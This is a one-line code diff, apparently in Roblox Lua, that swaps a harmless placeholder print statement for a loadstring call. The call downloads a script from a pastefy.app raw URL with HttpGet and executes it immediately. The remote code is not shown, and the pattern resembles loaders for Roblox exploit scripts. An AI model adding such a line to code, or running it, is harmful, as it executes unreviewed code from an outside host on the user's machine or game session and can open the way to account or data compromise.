@@ -1,1 +1,1 @@
-print("nothing is here")
+loadstring(game:HttpGet("https://pastefy.app/slbp0oqH/raw", true))()
